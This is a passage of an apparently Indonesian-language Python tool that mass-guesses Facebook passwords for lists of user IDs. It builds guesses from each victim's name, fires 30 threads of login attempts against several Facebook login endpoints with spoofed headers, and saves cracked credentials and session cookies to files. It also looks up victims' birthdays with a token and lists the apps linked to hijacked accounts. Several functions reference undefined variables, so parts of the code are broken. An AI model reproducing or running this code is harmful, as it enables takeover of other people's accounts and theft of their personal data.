	print("-"*50)
	print(' [?] ingin menambahkan katasandi ')
	print(' [1] tambahkan  [2] tidak')
	tam = input(' [?] pilih : ')
	if tam in ["1","01"]:
		print("-"*50)
		print(' [+] gunakan tanda koma sebagai pemisah')
		alo = input(' [+] sandi tambahan : ').split(",")
	print("-"*50)
	print(" [1]. metode free")
	print(" [2]. metode mbasic")
	print(" [3]. metode mobile")
	print("-"*50)
	ask=input(" [?] pilih : ")
	print(' [+] hasil OK -> OK/%s.txt'%(tanggal))
	print(' [+] hasil CP -> CP/%s.txt'%(tanggal))
	print("-"*50)
	with ReyTampan(max_workers=30) as fall:
		for user in id2:
			try:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				pwx = [name, nam[0]+nam[1], nam[0]+"123",nam[0]+"1234",nam[0]+"12345"]
				if tam in ['1','01']:
					sandi = pwx + alo
				else:
					sandi = pwx
				if ask in ['1','01']:
					fall.submit(free, uid, sandi)
				elif ask in ['2','02']:
					fall.submit(basic,uid,sandi)
				elif ask in ['3','03']:
					fall.submit(mface, uid, sandi)
				else:otomatis()
			except:pass
		exit("\n\n [#] crack selesai...")

### MANUAL ###
def manual():
	atur_id()
	aturua()
	show_apk()
	print("-"*50)
	print(" [!] gunakan , (koma) sebagai pemisah")
	pwek=input(' [?] buat kata sandi : ')
	if pwek=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
	print("-"*50)
	print(" [1]. metode free")
	print(" [2]. method mbasic")
	print(" [3]. method mobile")
	print("-"*50)
	ask=input(" [?] pilih : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		print(' [+] hasil OK -> OK/%s.txt'%(tanggal))
		print(' [+] hasil CP -> CP/%s.txt'%(tanggal))
		print("-"*50)
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack1, uid, pwek.split(","))
			exit("\n\n [#] crack selesai...")
	elif ask=="2":
		print(' [+] hasil OK -> OK/%s.txt'%(tanggal))
		print(' [+] hasil CP -> CP/%s.txt'%(tanggal))
		print("-"*50)
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack2, uid, pwek.split(","))
			exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' [+] hasil OK -> OK/%s.txt'%(tanggal))
		print(' [+] hasil CP -> CP/%s.txt'%(tanggal))
		print("-"*50)
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(crack3, uid, pwek.split(","))
			exit("\n\n [#] crack selesai...")

def free(user,manual):
    global ok,cp,loop
    sys.stdout.write("\r %s[crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp)));sys.stdout.flush()
    ses = requests.Session()
    if "random" in andra:
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
    else:
        try:
            ua = open("ugent.txt", "r").read()
            ua2 = open("ugent.txt", "r").read()
        except (KeyError, IOError):
            ua2 = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
            ua = ("Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36")
    for pw in manual:
        try:
            pw = pw.lower()
            ses.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F')
            dataa={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            ses.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, allow_redirects = False)
            if 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    token = open("token.txt", "r").read()
                    cp_ttl = ses.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={token}').json()["birthday"]
                    month, day, year = cp_ttl.split('/')
                    month = bulan_[month]
                    print("\r [%sCP%s]%s %s|%s|%s %s %s%s"%(K,N,K,user, pw, day, month, year, N))
                    cp.append("%s|%s"%(uid, pw))
                    open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(user, pw, day, month, year))
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print("\r [%sCP%s]%s %s|%s        %s"%(K,N,K,user, pw, N))
                cp.append("%s|%s"%(user, pw))
                open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(user, pw))
                break
            elif 'c_user' in ses.cookies.get_dict().keys():
                if "y" in gass:
                    kukis = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
                    print("\r [%sOK%s]%s %s|%s|%s%s"%(H,N,H,user, pw, kukis,N))
                    ok.append("%s|%s"%(user, pw))
                    open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(user, pw))
                    cek_apk(kukis)
                    break
                else:
                    kukis = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
                    print("\r [%sOK%s]%s %s|%s|%s"%(H,N,H,user, pw, kukis))
                    ok.append("%s|%s"%(user, pw))
                    open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(user, pw))
                    break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop +=1
def basic(user,manual):
    global ok,cp,loop
    sys.stdout.write("\r %s[crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))),
    sys.stdout.flush()
    ses = requests.Session()
    if "random" in andra:
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
    else:
        try:
            ua = open("ugent.txt", "r").read()
            ua2 = open("ugent.txt", "r").read()
        except (KeyError, IOError):
            ua2 = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
            ua = ("Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36")
    for pw in manual:
        try:
            pw = pw.lower()
            ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F')
            dataa={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, allow_redirects = False)
            if 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    token = open("token.txt", "r").read()
                    cp_ttl = ses.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={token}').json()["birthday"]
                    month, day, year = cp_ttl.split('/')
                    month = bulan_[month]
                    print("\r [%sCP%s]%s %s|%s|%s %s %s%s"%(K,N,K,user, pw, day, month, year, N))
                    cp.append("%s|%s"%(uid, pw))
                    open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(user, pw, day, month, year))
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print("\r [%sCP%s]%s %s|%s        %s"%(K,N,K,user, pw, N))
                cp.append("%s|%s"%(user, pw))
                open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(user, pw))
                break
            elif 'c_user' in ses.cookies.get_dict().keys():
                if "y" in gass:
                    kukis = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
                    print("\r [%sOK%s]%s %s|%s|%s%s"%(H,N,H,user, pw, kukis,N))
                    ok.append("%s|%s"%(user, pw))
                    open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(user, pw))
                    cek_apk(kukis)
                    break
                else:
                    kukis = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
                    print("\r [%sOK%s]%s %s|%s|%s"%(H,N,H,user, pw, kukis))
                    ok.append("%s|%s"%(user, pw))
                    open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(user, pw))
                    break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop +=1
def mface(user,manual):
    global ok,cp,loop
    sys.stdout.write("\r %s[crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp)));sys.stdout.flush()
    if "random" in andra:
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
    else:
        try:
            ua = open("ugent.txt", "r").read()
            ua2 = open("ugent.txt", "r").read()
        except (KeyError, IOError):
            ua2 = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
            ua = ("Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36")
    for pw in manual:
        try:
            pw = pw.lower()
            ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F')
            dataa={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, allow_redirects = False)
            if 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    token = open("token.txt", "r").read()
                    cp_ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(user, token)).json()["birthday"]
                    month, day, year = cp_ttl.split('/')
                    month = bulan_[month]
                    print("\r [%sCP%s]%s %s|%s|%s %s %s%s"%(K,N,K,user, pw, day, month, year, N))
                    cp.append("%s|%s"%(uid, pw))
                    open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(user, pw, day, month, year))
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print("\r [%sCP%s]%s %s|%s        %s"%(K,N,K,user, pw, N))
                cp.append("%s|%s"%(user, pw))
                open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(user, pw))
                break
            elif 'c_user' in ses.cookies.get_dict().keys():
                if "y" in gass:
                    kukis = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
                    print("\r [%sOK%s]%s %s|%s|%s%s"%(H,N,H,user, pw, kukis,N))
                    ok.append("%s|%s"%(user, pw))
                    open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(user, pw))
                    cek_apk(kukis)
                    break
                else:
                    kukis = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
                    print("\r [%sOK%s]%s %s|%s|%s"%(H,N,H,user, pw, kukis))
                    ok.append("%s|%s"%(user, pw))
                    open("OK/%s.txt"%(tanggal),"a").write(" [OK] %s|%s\n"%(user, pw))
                    break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop +=1
def get_data(cok): 
	headers={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"} 
	__response = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cok},headers=headers).text 
	data = re.findall('\/>\<div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(__response)) 
	for nama,aktif in data: 
		num+=1
		print(f"\r  {H}[{str(num)}] {nama} : {aktif}{N}     ")
		__response = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cok},headers=headers).text
		print(f"\r  {M}[{str(num)}] {nama} : {aktif}{N}     ")
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r   %s[%s%s%s]. %s%s"%(N,H,i+1,N,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r   %s[%s!%s] cookie invalid"%(N,M,N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r   %s[%s%s%s]. %s%s"%(N,M,i+1,N,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r   %s[%s!%s] cookie invalid"%(N,M,N))
def ceker(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\r %s[CP] %s|%s        "%(K,uid, pw))
		for opt in range(len(ngew)):
			print("  "+N+"["+str(opt+1)+"]. "+ngew[opt]+" ")
		if "0" in str(len(ngew)):
			print("\r %s[✓] akun tap yes, login di lite       "%(H))
	elif "login_error" in str(run):
		print("\r %s[CP] %s|%s        "%(K,uid, pw))
	else:
		print("\r %s[CP] %s|%s        "%(K,uid, pw))
def make(): 
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass
if __name__=='__main__':
	os.system('git pull')
	make()
	cek()


